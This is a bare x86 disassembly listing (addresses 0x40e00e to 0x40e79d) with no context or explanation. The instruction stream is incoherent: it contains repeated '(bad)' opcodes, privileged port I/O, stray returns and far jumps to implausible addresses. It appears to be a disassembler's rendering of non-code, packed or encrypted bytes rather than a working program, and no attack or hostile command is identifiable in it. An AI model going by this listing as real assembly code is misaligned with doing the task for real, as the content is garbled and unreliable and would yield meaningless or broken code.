  40e00e:	jle    0x40dfc5
  40e010:	retf   
  40e011:	xor    eax,DWORD PTR [edx-0x2afde409]
  40e017:	sar    edx,1
  40e019:	add    eax,0x30867deb
  40e01e:	xchg   ecx,eax
  40e01f:	mov    al,ds:0x75bdd834
  40e024:	(bad)  
  40e025:	into   
  40e026:	in     eax,dx
  40e027:	jmp    0x40e014
  40e029:	rol    ebp,cl
  40e02b:	pop    eax
  40e02c:	sbb    eax,0xf9443562
  40e031:	lahf   
  40e032:	loop   0x40e082
  40e034:	xchg   esp,eax
  40e035:	imul   eax,DWORD PTR [esi-0x464a081a],0x49
  40e03c:	popa   
  40e03d:	and    dl,BYTE PTR [esi]
  40e03f:	jl     0x40dff5
  40e041:	mov    ah,0x5
  40e043:	sub    al,0x92
  40e045:	dec    edi
  40e046:	or     BYTE PTR [ecx+eax*4+0x74b85169],dl
  40e04d:	or     bh,dh
  40e04f:	or     BYTE PTR [eax],al
  40e051:	iret   
  40e052:	lock or cl,BYTE PTR ds:[ebx-0x3e]
  40e057:	jmp    0x119b24e4
  40e05c:	aad    0x77
  40e05e:	xor    al,0x71
  40e060:	fld    DWORD PTR [edi+0x6ef5436e]
  40e066:	mov    esp,0x7dc07072
  40e06b:	jnp    0x40e013
  40e06d:	fstp   st(3)
  40e06f:	in     al,0x3c
  40e071:	pop    esi
  40e072:	outs   dx,BYTE PTR ds:[esi]
  40e073:	sbb    al,0x20
  40e075:	les    edi,FWORD PTR [edx-0x946e436]
  40e07b:	pop    ss
  40e07c:	mov    DWORD PTR [edx+ebx*8+0x5e],eax
  40e080:	add    al,0x78
  40e082:	int    0x7e
  40e084:	mov    ecx,0x9e08037d
  40e089:	es push edi
  40e08b:	imul   ecx,DWORD PTR [ebx-0x36],0x339c604b
  40e092:	adc    bl,BYTE PTR [ebp-0x1e74dda7]
  40e098:	int    0xe9
  40e09a:	pop    es
  40e09b:	mov    edi,0x3b3fe66e
  40e0a0:	data16 sub bl,ah
  40e0a3:	jmp    0x40e049
  40e0a5:	data16 cmp bh,BYTE PTR [eax]
  40e0a8:	std    
  40e0a9:	int    0x9e
  40e0ab:	sub    DWORD PTR [eax+0x1bc32ddd],edi
  40e0b1:	xchg   ebp,eax
  40e0b2:	pop    ds
  40e0b3:	inc    edx
  40e0b4:	out    0xa4,al
  40e0b6:	mov    bl,0x3a
  40e0b8:	in     eax,dx
  40e0b9:	es sub eax,0x90dc393c
  40e0bf:	mov    eax,0x1833282d
  40e0c4:	sbb    dl,BYTE PTR [ebp+0x21bc35f8]
  40e0ca:	fbld   TBYTE PTR [edi+eax*8+0x20f5885c]
  40e0d1:	adc    DWORD PTR ds:0xd9218570,ecx
  40e0d7:	inc    eax
  40e0d8:	adc    al,0xc
  40e0da:	or     eax,0x2320cf19
  40e0df:	int3   
  40e0e0:	pushf  
  40e0e1:	fsubr  st,st(5)
  40e0e3:	fs dec edx
  40e0e5:	and    BYTE PTR [eax],0x19
  40e0e8:	imul   ebp,DWORD PTR [esi],0xc526c0eb
  40e0ee:	loope  0x40e075
  40e0f0:	mov    edi,edi
  40e0f2:	addr16 push ebx
  40e0f4:	mov    ebp,0xc7edf337
  40e0f9:	lock int 0x19
  40e0fc:	or     al,0xd7
  40e0fe:	pop    ecx
  40e0ff:	push   0x76
  40e101:	jne    0x40e164
  40e103:	cmp    DWORD PTR [ebp-0x2c7c0f86],eax
  40e109:	add    ebp,edx
  40e10b:	jno    0x40e111
  40e10d:	call   0xbfaa0228
  40e112:	jmp    0xd3abd025
  40e117:	into   
  40e118:	jae    0x40e0a3
  40e11a:	mov    ch,0x5
  40e11c:	stos   BYTE PTR es:[edi],al
  40e11d:	mov    es,WORD PTR [ebx]
  40e11f:	cs xchg edx,eax
  40e121:	mov    edx,0x292572b8
  40e126:	jbe    0x40e0b6
  40e128:	inc    ebp
  40e129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e12a:	test   ch,dh
  40e12c:	cmp    edx,DWORD PTR [ecx]
  40e12e:	xor    DWORD PTR [edi-0xe],0xb2ad46ca
  40e135:	ins    BYTE PTR es:[edi],dx
  40e136:	fist   DWORD PTR [edi+0x56]
  40e139:	inc    edx
  40e13a:	adc    ebx,esp
  40e13c:	add    al,0xc2
  40e13e:	imul   ebx,DWORD PTR [eax-0x430a9868],0x3f04407d
  40e148:	jbe    0x40e19e
  40e14a:	push   es
  40e14b:	or     eax,0xfa3df3cd
  40e150:	mov    dl,0xff
  40e152:	(bad)  
  40e153:	push   ds
  40e154:	mov    cl,0xa5
  40e156:	sti    
  40e157:	dec    ebx
  40e158:	leave  
  40e159:	xor    ch,BYTE PTR [edi+ebx*1-0x7a]
  40e15d:	pusha  
  40e15e:	out    0x7d,eax
  40e160:	inc    edx
  40e161:	lods   al,BYTE PTR ds:[esi]
  40e162:	mov    ecx,0xd78a0783
  40e167:	and    al,0xe7
  40e169:	loopne 0x40e0fc
  40e16b:	jae    0x40e1c9
  40e16d:	pop    edi
  40e16e:	fistp  DWORD PTR [eax+ebp*2]
  40e171:	sub    dl,BYTE PTR [eax+eiz*1]
  40e174:	and    ah,BYTE PTR [ecx]
  40e176:	fucom  st(5)
  40e178:	adc    ecx,eax
  40e17a:	push   esp
  40e17b:	rcr    BYTE PTR [ecx+0x57],cl
  40e17e:	xchg   edi,eax
  40e17f:	dec    ecx
  40e180:	repnz addr16 xor cl,al
  40e184:	adc    eax,0x86cf6103
  40e189:	mov    dh,BYTE PTR [edx+0x68046186]
  40e18f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e190:	or     eax,0x13f7f3a3
  40e195:	jmp    0x40e13d
  40e197:	adc    DWORD PTR [eax-0x1138c05b],ebp
  40e19d:	pop    edx
  40e19e:	(bad)  
  40e19f:	cmp    ah,dh
  40e1a1:	lods   al,BYTE PTR ds:[esi]
  40e1a2:	fwait
  40e1a3:	jmp    0x23c2cbf9
  40e1a8:	mov    bl,0xf2
  40e1aa:	out    dx,al
  40e1ab:	das    
  40e1ac:	hlt    
  40e1ad:	ficom  WORD PTR [ecx-0x659e0fbd]
  40e1b3:	sbb    cl,ch
  40e1b5:	dec    ebp
  40e1b6:	xor    esp,DWORD PTR [edx]
  40e1b8:	leave  
  40e1b9:	loope  0x40e180
  40e1bb:	add    esp,DWORD PTR [ecx-0x49de4e65]
  40e1c1:	pop    edx
  40e1c2:	shl    DWORD PTR [ebp+ebx*4-0x1b503a14],cl
  40e1c9:	xor    dl,bl
  40e1cb:	mov    edi,0x4f76d721
  40e1d0:	leave  
  40e1d1:	les    ecx,FWORD PTR [eax]
  40e1d3:	pushf  
  40e1d4:	push   esp
  40e1d5:	test   DWORD PTR [ecx],ecx
  40e1d7:	jp     0x40e1b5
  40e1d9:	mov    bh,0xed
  40e1db:	and    DWORD PTR [ebp+0x7b9682c3],eax
  40e1e1:	bound  edx,QWORD PTR [ecx]
  40e1e3:	dec    ecx
  40e1e4:	pop    ecx
  40e1e5:	add    eax,0xa58491d2
  40e1ea:	sub    ch,dh
  40e1ec:	pushf  
  40e1ed:	lahf   
  40e1ee:	jp     0x40e1de
  40e1f0:	xchg   ebx,eax
  40e1f1:	pop    ecx
  40e1f2:	push   esp
  40e1f3:	pusha  
  40e1f4:	call   0x849f061f
  40e1f9:	sbb    DWORD PTR [edx+0x63],esp
  40e1fc:	jae    0x40e20d
  40e1fe:	mov    dh,0xc3
  40e200:	xchg   esi,eax
  40e201:	cmc    
  40e202:	das    
  40e203:	or     dh,dh
  40e205:	pop    edi
  40e206:	xor    dl,BYTE PTR [edx+esi*1+0xa98ec15]
  40e20d:	aas    
  40e20e:	out    0x62,eax
  40e210:	out    dx,eax
  40e211:	loop   0x40e26f
  40e213:	test   eax,0x94998140
  40e218:	push   ds
  40e219:	shr    DWORD PTR [edi+0x21],0xb0
  40e21d:	imul   DWORD PTR [ecx+eax*1]
  40e220:	mov    edx,0x9832f65a
  40e225:	mov    bl,0x79
  40e227:	jg     0x40e272
  40e229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e22a:	mov    ds:0xcc13028f,al
  40e22f:	push   esp
  40e230:	hlt    
  40e231:	pop    ds
  40e232:	push   esp
  40e233:	test   BYTE PTR [esi+0x30],dl
  40e236:	sbb    eax,0x6c844e19
  40e23b:	push   ebx
  40e23c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e23d:	rcl    BYTE PTR [edx],0x4
  40e240:	mov    dh,0x18
  40e242:	push   esi
  40e243:	dec    ebx
  40e244:	jmp    0x40e1cb
  40e246:	sbb    eax,0x118598b5
  40e24b:	cmc    
  40e24c:	test   al,0xb0
  40e24e:	mov    ss,WORD PTR [esi]
  40e250:	in     eax,0xf8
  40e252:	das    
  40e253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e254:	inc    eax
  40e255:	and    bl,ah
  40e257:	xor    DWORD PTR [eax+0x3e],ebp
  40e25a:	mov    ecx,0xaf2f4c47
  40e25f:	push   cs
  40e260:	xor    eax,0x6d18a464
  40e265:	lods   al,BYTE PTR ds:[esi]
  40e266:	call   0x8d84:0x38885bf
  40e26d:	sub    al,0x69
  40e26f:	pusha  
  40e270:	test   esi,0x62e3ce36
  40e276:	push   es
  40e277:	mov    dl,0xee
  40e279:	add    dh,BYTE PTR ds:[ecx]
  40e27c:	mov    BYTE PTR [ebp-0x42],ch
  40e27f:	dec    ebp
  40e280:	mov    ds:0xc6c48779,eax
  40e285:	push   edi
  40e286:	ins    BYTE PTR es:[edi],dx
  40e287:	cwde   
  40e288:	or     DWORD PTR [ebp-0xe722bd6],esp
  40e28e:	xchg   edx,eax
  40e28f:	jnp    0x40e2fd
  40e291:	out    0xb,al
  40e293:	pop    es
  40e294:	mov    al,ds:0x4163c677
  40e299:	jbe    0x40e2a0
  40e29b:	and    esp,DWORD PTR [edx]
  40e29d:	imul   esi,edx,0x33
  40e2a0:	add    BYTE PTR [esi],ah
  40e2a2:	mov    ds:0x6a941dd4,ax
  40e2a8:	stos   DWORD PTR es:[edi],eax
  40e2a9:	test   al,0x1a
  40e2ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2ad:	sbb    al,0x81
  40e2af:	outs   dx,BYTE PTR ds:[esi]
  40e2b0:	push   cs
  40e2b1:	cmp    bh,bl
  40e2b3:	push   ebx
  40e2b4:	adc    ebx,DWORD PTR ds:0x4713681e
  40e2ba:	fimul  DWORD PTR [esp+ebx*8+0xd]
  40e2be:	adc    esp,eax
  40e2c0:	mov    DWORD PTR [ebp+0x1867922b],edi
  40e2c6:	aas    
  40e2c7:	pop    ds
  40e2c8:	push   ecx
  40e2c9:	add    BYTE PTR [edi],0x6d
  40e2cc:	lods   eax,DWORD PTR ds:[esi]
  40e2cd:	push   0x616faa99
  40e2d2:	lods   eax,DWORD PTR ds:[esi]
  40e2d3:	icebp  
  40e2d4:	xchg   ebx,eax
  40e2d5:	or     BYTE PTR [esi+0x1e839fc8],ch
  40e2db:	pop    esp
  40e2dc:	ja     0x40e2f4
  40e2de:	lea    edx,[eax-0x41bd4d8f]
  40e2e4:	mov    ch,dh
  40e2e6:	aam    0x46
  40e2e8:	(bad)  
  40e2e9:	adc    BYTE PTR [ecx+0x72],dh
  40e2ec:	clc    
  40e2ed:	mov    dh,0x4a
  40e2ef:	sti    
  40e2f0:	loop   0x40e343
  40e2f2:	(bad)  
  40e2f3:	mov    ah,0x6a
  40e2f5:	xlat   BYTE PTR ds:[ebx]
  40e2f6:	push   eax
  40e2f7:	inc    ebp
  40e2f8:	outs   dx,DWORD PTR ds:[esi]
  40e2f9:	inc    ebx
  40e2fa:	jno    0x40e296
  40e2fc:	lea    edi,[eax]
  40e2fe:	outs   dx,BYTE PTR ds:[esi]
  40e2ff:	push   edx
  40e300:	mov    WORD PTR [ebx+0x399cfa71],gs
  40e306:	fadd   DWORD PTR [eax-0x6bec542e]
  40e30c:	push   esp
  40e30d:	ret    
  40e30e:	jo     0x40e2e9
  40e310:	loope  0x40e331
  40e312:	adc    BYTE PTR [edx-0x11ddb8e4],bl
  40e318:	cmc    
  40e319:	pop    ss
  40e31a:	mov    eax,0x1245f2f0
  40e31f:	mov    eax,ds:0x6ee22c62
  40e324:	es cmp eax,0x291adbc0
  40e32a:	mov    eax,ds:0xde225fdf
  40e32f:	dec    eax
  40e330:	retf   
  40e331:	cmp    ebx,DWORD PTR [ecx-0x6c]
  40e334:	mov    ecx,0xec8fe610
  40e339:	daa    
  40e33a:	in     al,0x37
  40e33c:	(bad)  
  40e33e:	push   edi
  40e33f:	inc    esp
  40e340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e342:	(bad)
  40e346:	cs dec eax
  40e348:	push   edi
  40e349:	mov    ebx,0x9bed31cb
  40e34e:	add    DWORD PTR [esi-0x165ecff2],esi
  40e354:	adc    bh,BYTE PTR [edx-0x7d]
  40e357:	iret   
  40e358:	gs cmp eax,eax
  40e35b:	add    DWORD PTR [eax-0x76],ebx
  40e35e:	loopne 0x40e34b
  40e360:	sbb    eax,0x254cd0ea
  40e365:	es pushf 
  40e367:	jl     0x40e390
  40e369:	inc    ecx
  40e36a:	pop    ecx
  40e36b:	mov    bh,0x5a
  40e36d:	lea    eax,ds:0x5b3e220
  40e373:	mov    al,ds:0x4a7687b1
  40e378:	addr16 jp 0x40e3da
  40e37b:	jl     0x40e383
  40e37d:	sub    eax,0x7eb139bf
  40e382:	cmc    
  40e383:	fcomp  QWORD PTR [ecx]
  40e385:	(bad)  
  40e386:	out    dx,al
  40e387:	xchg   ebx,eax
  40e388:	out    dx,ax
  40e38a:	xchg   ebp,eax
  40e38b:	xchg   esi,eax
  40e38c:	sti    
  40e38d:	mov    cl,0x36
  40e38f:	mov    dl,0xd2
  40e391:	test   BYTE PTR [ebx],cl
  40e393:	pop    ss
  40e394:	pop    ebx
  40e395:	xchg   ebp,eax
  40e396:	popa   
  40e397:	retf   0x3997
  40e39a:	cmp    DWORD PTR [edi+0x655473aa],ebp
  40e3a0:	and    eax,0x53b9bd68
  40e3a5:	inc    esp
  40e3a6:	push   es
  40e3a7:	cmp    DWORD PTR [edi-0x48],esp
  40e3aa:	sub    DWORD PTR [esi+ebp*2],eax
  40e3ad:	and    BYTE PTR [ebp-0x31b1fc61],0xa9
  40e3b4:	xchg   ecx,eax
  40e3b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3b7:	jb     0x40e39b
  40e3b9:	push   edi
  40e3ba:	outs   dx,DWORD PTR ds:[esi]
  40e3bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3bc:	mov    esi,0xc50e2ca6
  40e3c1:	mov    ecx,0x436c8b4c
  40e3c6:	mov    ah,0xf
  40e3c8:	call   0xd4437b42
  40e3cd:	push   ds
  40e3ce:	sar    edi,1
  40e3d0:	test   ch,0x9a
  40e3d3:	xchg   ecx,eax
  40e3d4:	adc    eax,DWORD PTR [edx-0x5b1d6e9c]
  40e3da:	retf   
  40e3db:	xor    eax,0x25dae1f2
  40e3e0:	push   ds
  40e3e1:	pop    ebp
  40e3e2:	dec    ecx
  40e3e3:	popa   
  40e3e4:	xchg   ecx,eax
  40e3e5:	cmp    DWORD PTR [esi],ebp
  40e3e7:	test   eax,0xf15030b4
  40e3ec:	or     eax,0xf8905787
  40e3f1:	cs or  al,0x91
  40e3f4:	mov    dl,0x7b
  40e3f6:	or     al,0x81
  40e3f8:	arpl   WORD PTR [ecx],bx
  40e3fa:	and    bh,al
  40e3fc:	jmp    0x9c1f:0x34fb30af
  40e403:	and    eax,0x880b1f22
  40e408:	mov    dl,0xa4
  40e40a:	std    
  40e40b:	jecxz  0x40e39c
  40e40d:	jmp    0x17ef:0xc885cb6c
  40e414:	das    
  40e415:	mov    ebp,0x48063e0c
  40e41a:	mov    eax,0xed4aee1d
  40e41f:	jno    0x40e422
  40e421:	(bad)  
  40e422:	out    dx,al
  40e423:	push   eax
  40e424:	sub    DWORD PTR [ebx],edx
  40e426:	jge    0x40e3e4
  40e428:	pop    edi
  40e429:	loopne 0x40e3db
  40e42b:	fmul   QWORD PTR [edi+0x3b]
  40e42e:	cdq    
  40e42f:	rcr    DWORD PTR [edx+ebx*1-0x18],0x5
  40e434:	retf   0x4f23
  40e437:	(bad)
  40e43a:	mov    edx,0xd010f28e
  40e43f:	in     al,dx
  40e440:	and    ebp,esi
  40e442:	push   esi
  40e443:	inc    eax
  40e444:	mov    ds:0x61336e28,eax
  40e449:	jecxz  0x40e406
  40e44b:	or     al,0x51
  40e44d:	jp     0x40e3f1
  40e44f:	fistp  WORD PTR [edi+0x2b]
  40e452:	inc    ecx
  40e453:	lods   al,BYTE PTR ds:[esi]
  40e454:	popa   
  40e455:	add    bl,dl
  40e457:	fs dec edi
  40e459:	pop    ebx
  40e45a:	sbb    eax,0xbf4c4d3c
  40e45f:	addr16 cwde 
  40e461:	test   DWORD PTR [ebp-0x4b17f929],eax
  40e467:	pop    esi
  40e468:	adc    eax,0xd53af503
  40e46d:	pusha  
  40e46e:	and    esi,esp
  40e470:	cmp    esi,edx
  40e472:	adc    eax,0xe51a0b7a
  40e477:	hlt    
  40e478:	hlt    
  40e479:	add    eax,0xdef1a9c6
  40e47e:	(bad)  
  40e47f:	test   eax,0x3508ca89
  40e484:	xchg   esp,eax
  40e485:	mov    al,ds:0x312b76d8
  40e48a:	mov    cl,dl
  40e48c:	in     al,dx
  40e48d:	repz leave 
  40e48f:	and    eax,0x16e101eb
  40e494:	xchg   edi,eax
  40e495:	cwde   
  40e496:	sar    BYTE PTR [edx-0x44569f7e],0x1d
  40e49d:	(bad)  
  40e49f:	mov    al,0x8
  40e4a1:	call   DWORD PTR [ebp+0x4c57f852]
  40e4a7:	mov    ebx,0x624cf5ce
  40e4ac:	mov    edx,0xe8798f0c
  40e4b1:	and    al,0x3
  40e4b3:	imul   ebx,DWORD PTR [ebx],0xffffffd1
  40e4b6:	pop    edx
  40e4b7:	mov    bl,0xe5
  40e4b9:	and    eax,DWORD PTR [esi+0xe3c9c79]
  40e4bf:	inc    esi
  40e4c0:	sbb    DWORD PTR [ebx],esi
  40e4c2:	xor    BYTE PTR [ecx-0x2cf88a43],ah
  40e4c8:	xchg   ebp,eax
  40e4c9:	fiadd  DWORD PTR [edi]
  40e4cb:	sbb    al,0xb8
  40e4cd:	add    eax,0xd209b388
  40e4d2:	test   al,0xfe
  40e4d4:	mov    edi,0xae76b36a
  40e4d9:	push   ebp
  40e4da:	adc    bh,BYTE PTR [ebp+0x3e54b256]
  40e4e0:	xor    DWORD PTR [esi-0x3ef3a283],edx
  40e4e6:	or     eax,0x27ba3c93
  40e4eb:	lods   eax,DWORD PTR ds:[esi]
  40e4ec:	dec    edi
  40e4ed:	inc    esp
  40e4ee:	xchg   ebp,eax
  40e4ef:	icebp  
  40e4f0:	mov    esp,0x52df64ad
  40e4f5:	push   edx
  40e4f6:	mov    edx,0x8ae35218
  40e4fb:	in     eax,0x5
  40e4fd:	sti    
  40e4fe:	inc    esi
  40e4ff:	int    0xc7
  40e501:	mov    al,0x67
  40e503:	not    DWORD PTR [edx+0x54]
  40e506:	call   0x1884:0x56bbda71
  40e50d:	rol    BYTE PTR [ebx],1
  40e50f:	push   ecx
  40e510:	in     eax,dx
  40e511:	ret    
  40e512:	jle    0x40e4fc
  40e514:	cmp    eax,0x6b392571
  40e519:	dec    esp
  40e51a:	into   
  40e51b:	sbb    eax,DWORD PTR [edx-0x763f034c]
  40e521:	scas   eax,DWORD PTR es:[edi]
  40e522:	leave  
  40e523:	clc    
  40e524:	test   dl,bh
  40e526:	in     al,dx
  40e527:	xchg   ebx,eax
  40e528:	jae    0x40e519
  40e52a:	js     0x40e528
  40e52c:	daa    
  40e52d:	mov    ds,esi
  40e52f:	jle    0x40e539
  40e531:	fs (bad) 
  40e533:	xchg   ecx,eax
  40e534:	outs   dx,BYTE PTR ds:[esi]
  40e535:	add    al,0x93
  40e537:	add    dl,ch
  40e539:	iret   
  40e53a:	jne    0x40e506
  40e53c:	and    dh,0x81
  40e53f:	out    0xbe,al
  40e541:	mov    bl,0x44
  40e543:	js     0x40e4f9
  40e545:	test   al,0xad
  40e547:	js     0x40e58c
  40e549:	adc    DWORD PTR [esi+0x7f],0x1c
  40e54d:	xchg   ebp,eax
  40e54e:	jne    0x40e5c2
  40e550:	stc    
  40e551:	inc    eax
  40e552:	mov    ebx,0x4d3fdf89
  40e557:	add    DWORD PTR [ebp-0x47],0xa3d3e9c2
  40e55e:	jge    0x40e54e
  40e560:	mov    bh,0xff
  40e562:	xchg   esi,eax
  40e563:	cmp    al,0x4e
  40e565:	jecxz  0x40e4f0
  40e567:	push   ecx
  40e568:	jge    0x40e575
  40e56a:	pop    esi
  40e56b:	das    
  40e56c:	cmc    
  40e56d:	out    0xd0,al
  40e56f:	test   BYTE PTR [ebx+eax*2+0x7dc2f96f],dl
  40e576:	outs   dx,BYTE PTR ds:[esi]
  40e577:	sbb    eax,0x6d4dfd2b
  40e57c:	add    DWORD PTR [eax-0x48],ecx
  40e57f:	into   
  40e580:	cli    
  40e581:	jb     0x40e56d
  40e583:	(bad)  
  40e584:	mov    ebx,DWORD PTR [esi+0x6a]
  40e587:	push   cs
  40e588:	data16 jo 0x40e5d7
  40e58b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e58c:	lods   al,BYTE PTR ds:[esi]
  40e58d:	sti    
  40e58e:	lahf   
  40e58f:	mov    cl,0xc6
  40e591:	inc    esp
  40e592:	adc    ah,BYTE PTR [eax-0x49]
  40e595:	je     0x40e551
  40e597:	repz or ch,bl
  40e59a:	les    esp,FWORD PTR fs:[edx+eax*4-0x42]
  40e59f:	lods   eax,DWORD PTR ds:[esi]
  40e5a0:	(bad)  
  40e5a1:	repz loope 0x40e5dc
  40e5a4:	test   BYTE PTR [ecx+0x3fc406d9],0x83
  40e5ab:	(bad)  
  40e5ac:	add    ebp,esp
  40e5ae:	fimul  DWORD PTR [ebp+0x77cd7972]
  40e5b4:	jmp    0x40e61a
  40e5b6:	pop    esp
  40e5b7:	add    BYTE PTR [ebp+ecx*8+0x348e5d71],bl
  40e5be:	add    DWORD PTR [esi-0x2035e388],0xffffffae
  40e5c5:	mov    dl,0xb7
  40e5c7:	(bad)
  40e5ca:	popf   
  40e5cb:	push   ebp
  40e5cc:	inc    edx
  40e5cd:	pop    ebp
  40e5ce:	or     DWORD PTR [eax+ecx*2],eax
  40e5d1:	ror    ch,1
  40e5d3:	pop    esi
  40e5d4:	hlt    
  40e5d5:	aaa    
  40e5d6:	sbb    ebx,DWORD PTR [edx+0x1e332fa6]
  40e5dc:	jbe    0x40e5f3
  40e5de:	push   edx
  40e5df:	fstp   DWORD PTR [edx]
  40e5e1:	fidivr WORD PTR [eax]
  40e5e3:	jae    0x40e5e5
  40e5e5:	call   0xe6a5d697
  40e5ea:	inc    esi
  40e5eb:	push   eax
  40e5ec:	aas    
  40e5ed:	lods   eax,DWORD PTR ds:[esi]
  40e5ee:	and    eax,0x7bbec99c
  40e5f3:	iret   
  40e5f4:	clc    
  40e5f5:	xchg   ebx,eax
  40e5f6:	jnp    0x40e5a6
  40e5f8:	xlat   BYTE PTR ss:[ebx]
  40e5fa:	add    BYTE PTR [ecx+0x22b294d6],ch
  40e600:	push   edi
  40e601:	aam    0xec
  40e603:	xchg   ebp,eax
  40e604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e605:	jb     0x40e637
  40e607:	mov    ecx,0xf883d58a
  40e60c:	and    al,0x16
  40e60e:	leave  
  40e60f:	popf   
  40e610:	jmp    0x3e854b
  40e615:	xor    al,BYTE PTR [edi-0x75]
  40e618:	es cmp al,0x17
  40e61b:	stc    
  40e61c:	or     BYTE PTR [edx+edi*2-0x2fb81602],bl
  40e623:	dec    ecx
  40e624:	shr    BYTE PTR cs:[ecx+0x45],1
  40e628:	sbb    ecx,ecx
  40e62a:	repz inc edx
  40e62c:	test   al,0xb4
  40e62e:	ficomp DWORD PTR [eax-0x2b09a218]
  40e634:	ins    DWORD PTR es:[edi],dx
  40e635:	or     BYTE PTR [edi-0x33],ah
  40e638:	aam    0x90
  40e63a:	jg     0x40e681
  40e63c:	xor    DWORD PTR [esi],esi
  40e63e:	ret    
  40e63f:	pushf  
  40e640:	jne    0x40e5f7
  40e642:	lea    esi,[eax]
  40e644:	pop    es
  40e645:	mov    ecx,0x8e2848dd
  40e64a:	arpl   dx,si
  40e64c:	(bad)  
  40e64d:	icebp  
  40e64e:	cmc    
  40e64f:	xor    eax,0x28cd0361
  40e654:	cld    
  40e655:	pop    es
  40e656:	ss call 0x3118b68f
  40e65c:	adc    edx,DWORD PTR [ecx+ebp*1-0x2717c37b]
  40e663:	push   cs
  40e664:	mov    ecx,0xa426183f
  40e669:	mov    ch,0xbe
  40e66b:	call   0x8432:0x6c9bc23
  40e672:	add    BYTE PTR [esi],al
  40e674:	sub    ebx,esi
  40e676:	sahf   
  40e677:	dec    esp
  40e678:	je     0x40e6d5
  40e67a:	jg     0x40e6d3
  40e67c:	mov    DWORD PTR [edx+0x61],edi
  40e67f:	sbb    ah,BYTE PTR [edx+0x47]
  40e682:	push   es
  40e683:	sbb    al,0xeb
  40e685:	fs gs daa 
  40e688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e689:	(bad)  
  40e68b:	xor    ebp,edx
  40e68d:	add    eax,0xfaa01683
  40e692:	xchg   esi,eax
  40e693:	mov    edi,0x8d65a42d
  40e698:	pop    ebx
  40e699:	loope  0x40e681
  40e69b:	int3   
  40e69c:	jl     0x40e6d7
  40e69e:	jl     0x40e67d
  40e6a0:	out    0x5b,al
  40e6a2:	cmp    eax,0xbbe1e2d3
  40e6a7:	xor    al,BYTE PTR [ecx-0x8]
  40e6aa:	cli    
  40e6ab:	add    BYTE PTR [esp+ebx*1],0xa7
  40e6af:	push   edx
  40e6b0:	mov    ds:0x2821926d,al
  40e6b5:	imul   ebx,DWORD PTR [eax+0x5d35104d],0x12fe1edd
  40e6bf:	dec    esi
  40e6c0:	sbb    ah,dh
  40e6c2:	imul   edi,DWORD PTR [ecx+0x5a],0x7
  40e6c6:	bound  ebx,QWORD PTR [eax-0x21]
  40e6c9:	bound  edi,QWORD PTR [ecx-0x3e]
  40e6cc:	shl    ah,1
  40e6ce:	pop    ebx
  40e6cf:	repz jp 0x40e6d6
  40e6d2:	jnp    0x40e6d7
  40e6d4:	std    
  40e6d5:	push   cs
  40e6d6:	xchg   edx,eax
  40e6d7:	aam    0xf3
  40e6d9:	out    dx,al
  40e6da:	push   edi
  40e6db:	repz inc esp
  40e6dd:	dec    ecx
  40e6de:	sub    eax,0x5deeb46e
  40e6e3:	addr16 jns 0x40e6ce
  40e6e6:	mov    ds:0xab6aab69,al
  40e6eb:	xchg   edx,eax
  40e6ec:	ins    BYTE PTR es:[edi],dx
  40e6ed:	pop    ebx
  40e6ee:	xchg   edi,eax
  40e6ef:	dec    ebp
  40e6f0:	ins    BYTE PTR es:[edi],dx
  40e6f1:	mov    cl,0x4f
  40e6f3:	lahf   
  40e6f4:	jge    0x40e6ca
  40e6f6:	pop    esp
  40e6f7:	cs and al,0xd4
  40e6fa:	push   esi
  40e6fb:	call   0x3cf23dc2
  40e700:	mov    eax,ds:0xe7ec3d81
  40e705:	das    
  40e706:	mov    esi,0x7ddfb07b
  40e70b:	adc    edi,edx
  40e70d:	mov    ah,0xd7
  40e70f:	mov    ebp,0x1c9d844
  40e714:	fwait
  40e715:	ret    0x1177
  40e718:	push   esi
  40e719:	push   esp
  40e71a:	fldpi  
  40e71c:	shl    bl,cl
  40e71e:	adc    al,0x8f
  40e720:	dec    esp
  40e721:	test   al,0xa7
  40e723:	push   cs
  40e724:	enter  0xe07c,0x1a
  40e728:	mov    ah,0x83
  40e72a:	scas   ax,WORD PTR es:[edi]
  40e72c:	or     BYTE PTR ds:[esi+0x5eecba51],dl
  40e733:	push   0x1151494c
  40e738:	shr    DWORD PTR [edi-0x55cea613],1
  40e73e:	sbb    BYTE PTR [edi+0x7d],al
  40e741:	sub    ah,BYTE PTR [ecx+0x62]
  40e744:	out    0x5c,al
  40e746:	sbb    eax,0x490885d7
  40e74b:	mov    al,ds:0x9ca9fdaa
  40e750:	add    al,0xf2
  40e752:	mov    BYTE PTR ss:[ebx+0x7552813d],dh
  40e759:	inc    ecx
  40e75a:	aad    0x40
  40e75c:	aad    0x92
  40e75e:	cmc    
  40e75f:	jo     0x40e7d7
  40e761:	push   ss
  40e762:	push   cs
  40e763:	mov    dl,0x16
  40e765:	sbb    edx,DWORD PTR [ebp+0x2a]
  40e768:	(bad)  
  40e76c:	sub    al,0xad
  40e76e:	int3   
  40e76f:	push   ebp
  40e770:	mov    bl,0xac
  40e772:	push   ebp
  40e773:	shl    BYTE PTR [ebp-0x41],1
  40e776:	push   esi
  40e777:	maxps  xmm7,XMMWORD PTR [edx]
  40e77a:	mov    ch,0x1
  40e77c:	adc    eax,0xa333b3b4
  40e781:	test   DWORD PTR [esi-0x7a233eb],edi
  40e787:	mov    edi,edi
  40e789:	pop    ds
  40e78a:	jnp    0x40e713
  40e78c:	ret    
  40e78d:	cmp    al,0x67
  40e78f:	cmp    eax,0x4b804eb9
  40e794:	cmp    edx,DWORD PTR [ebp+0x3b112b0c]
  40e79a:	fwait
  40e79b:	out    dx,al
  40e79c:	push   ebx
  40e79d:	mov    ebx,0xd75fdd53
